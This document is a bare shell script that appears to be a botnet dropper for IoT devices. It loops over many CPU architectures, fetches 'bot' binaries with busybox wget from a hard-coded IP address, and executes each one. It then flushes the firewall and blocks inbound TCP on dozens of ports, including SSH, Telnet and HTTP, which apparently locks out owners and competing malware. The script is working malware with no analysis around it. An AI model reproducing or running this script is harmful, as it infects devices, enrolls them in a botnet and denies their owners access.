=#!/bin/sh
u="lsezr"
bin_names="arm4 arm5 arm6 arm7 armv4eb armv4tl mips64 mips mipsel powerpc ppc440 m68k sh4 sparc x86_64 i686"
http_server="45.95.55.214"
for name in $bin_names
    do
    rm -rf $u
    cp $SHELL $u
    chmod 777 $u
    >$u
    busybox wget http://$http_server/scooter/bot.$name -O -> $u
    ./$u wget.$1.$name
done

iptables -F
iptables -A INPUT -p tcp --dport 22 -j DROP
iptables -A INPUT -p tcp --dport 23 -j DROP
iptables -A INPUT -p tcp --dport 53 -j DROP
iptables -A INPUT -p tcp --dport 27 -j DROP
iptables -A INPUT -p tcp --dport 443 -j DROP
iptables -A INPUT -p tcp --dport 80 -j DROP
iptables -A INPUT -p tcp --dport 90 -j DROP
iptables -A INPUT -p tcp --dport 86 -j DROP
iptables -A INPUT -p tcp --dport 8080 -j DROP
iptables -A INPUT -p tcp --dport 8089 -j DROP
iptables -A INPUT -p tcp --dport 9600 -j DROP
iptables -A INPUT -p tcp --dport 9090 -j DROP
iptables -A INPUT -p tcp --dport 9001 -j DROP
iptables -A INPUT -p tcp --dport 7070 -j DROP
iptables -A INPUT -p tcp --dport 8081 -j DROP
iptables -A INPUT -p tcp --dport 57 -j DROP
iptables -A INPUT -p tcp --dport 5757 -j DROP
iptables -A INPUT -p tcp --dport 8092 -j DROP
iptables -A INPUT -p tcp --dport 21412 -j DROP
iptables -A INPUT -p tcp --dport 5986 -j DROP
iptables -A INPUT -p tcp --dport 5985 -j DROP
iptables -A INPUT -p tcp --dport 17000 -j DROP
iptables -A INPUT -p tcp --dport 25565 -j DROP
iptables -A INPUT -p tcp --dport 123 -j DROP
iptables -A INPUT -p tcp --dport 1337 -j DROP
iptables -A INPUT -p tcp --dport 161 -j DROP
iptables -A INPUT -p tcp --dport 5555 -j DROP
iptables -A INPUT -p tcp --dport 4875 -j DROP 
iptables -A INPUT -p tcp --dport 707 -j DROP
iptables -A INPUT -p tcp --dport 7777 -j DROP
iptables -A INPUT -p tcp --dport 389 -j DROP
iptables -A INPUT -p tcp --dport 339 -j DROP
iptables -A INPUT -p tcp --dport 2701 -j DROP
iptables -A INPUT -p tcp --dport 4354 -j DROP
iptables -A INPUT -p tcp --dport 1234 -j DROP